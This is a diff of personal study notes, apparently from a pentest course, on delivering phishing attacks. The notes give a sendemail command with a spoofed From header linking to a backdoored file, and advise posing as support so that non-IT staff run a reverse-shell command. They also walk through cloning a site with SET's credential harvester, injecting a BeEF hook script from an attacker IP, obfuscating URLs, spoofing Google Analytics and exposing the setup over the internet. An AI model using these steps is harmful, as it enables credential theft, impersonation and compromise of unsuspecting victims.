@@ -2,12 +2,60 @@ Mail delivery
     Setting up SMTP Server
         Brevo website - signup for free plan - use their smtp server to send emails
 
-        in kali: sendemail -xu <username> -xp <password> -s <server>:<port> -f <from email> -t <to email> -u <title> -m <message containing a lik to the image/pdf with the backdoor> -o message-header="From: Mohamed Askar <m.askar@isecur1ty.org>"
-        
+        in kali: sendemail -xu <username> -xp <password> -s <server>:<port> -f <from email> -t <to email> -u <title> -m <message containing a link to the image/pdf with the backdoor hosted on some fileshare like dropbox> -o message-header="From: Mohamed Askar <m.askar@isecur1ty.org>"
+
+
          
     Using php
         requires a web hosting plan (for example: dreamhost)
         
         
+    Message from the support 
+        send a command to a non IT people to create reverse shell
 
 
+    Creating a replica or any website  
+        firefox addon: Web ScrapBook -> go to the webpage you want to download -> Capture tab (sources) to get source of the web page
+        in kali: settoolkit    (social engineering toolkit)
+                    social engineering attack
+                    website attack vectors
+                    credential harvester attack method
+                    custom import
+                    <ip>
+                    <path to stored website>
+                    copy the entire folder
+                    <url for the original website>
+
+        use bit.do to provide different url
+
+
+
+    BeEF Framework (browser exploitation framework)
+        beef/beef 
+
+        Hook method
+            download source -> edit index.html header with: <script src="http://<attacker IP>:3000/hook.js"></script>
+
+
+
+    URL Obfuscation
+        https://splitline.github.io/domain-obfuscator/
+        https://tinyurl.com/app
+
+
+    Indirect delivery - exploit google analiytics
+        view page source -> search for analiytics.js (if its there the website is using google analitics) -> find tracking ID -> use setoolkit 
+            SE attack 
+            Third party modules 
+            google analitics 
+            manual 
+            enter tracking ID, domain name, target page, title, referal page (beef page) 
+            print payload 
+            send it in a loop, set 15s intervals (ctrl c to stop)
+
+    To use over internet: 
+        port forwarding on the router
+        port forwarding using ssh (https://www.youtube.com/watch?v=111ZDMKVTL4)
+        DMZ host - forwards all ports
+        installing kali on the cloud
+        tunneling services
